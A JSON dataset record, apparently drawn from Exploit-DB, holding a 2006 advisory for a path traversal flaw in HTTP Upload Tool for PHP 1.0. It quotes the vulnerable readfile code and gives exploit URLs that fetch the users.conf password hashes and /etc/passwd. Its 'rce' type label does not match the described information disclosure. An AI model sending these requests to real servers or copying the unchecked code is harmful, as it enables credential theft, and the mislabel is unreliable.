{
  "id": "2791",
  "title": "HTTP Upload Tool - &#039;download.php&#039; Information Disclosure",
  "cve": "CVE-2006-7134",
  "vuln_type": "rce",
  "code": "#######################################################################################\r\n# Target:\r\n#\r\n#       HTTP Upload Tool For PHP 1.0\r\n#       http://uploadtool.sourceforge.net/\r\n#\r\n# Vulnerability:\r\n#\r\n#       Information disclosure\r\n#\r\n# Description:\r\n#\r\n#       The download.php file in Upload Tool for PHP neither verifies that a\r\n#       requestor has authenticated, nor performs any sanity checking on the file\r\n#       being requested. This allows an unauthenticated user to download any file\r\n#       which the web server has read rights to, including the users.conf file which\r\n#       contains a list of Upload Tool's users and their hashed passwords.\r\n#\r\n# Vulnerable Code (truncated):\r\n#\r\n#       $filename = $_GET['filename'];\r\n#       readfile(\"$filename\");\r\n#\r\n# Exploit:\r\n#\r\n#       http://www.examplesite.com/upload/bin/download.php?filename=../conf/users.conf\r\n#       http://www.examplesite.com/upload/bin/download.php?filename=/etc/passwd\r\n#\r\n# Discovered:\r\n#\r\n#       Craig Heffner\r\n#       heffnercj [at] gmail.com\r\n#       http://www.craigheffner.com\r\n#######################################################################################\r\n\r\n# milw0rm.com [2006-11-16]",
  "url": "https://www.exploit-db.com/exploits/2791"
}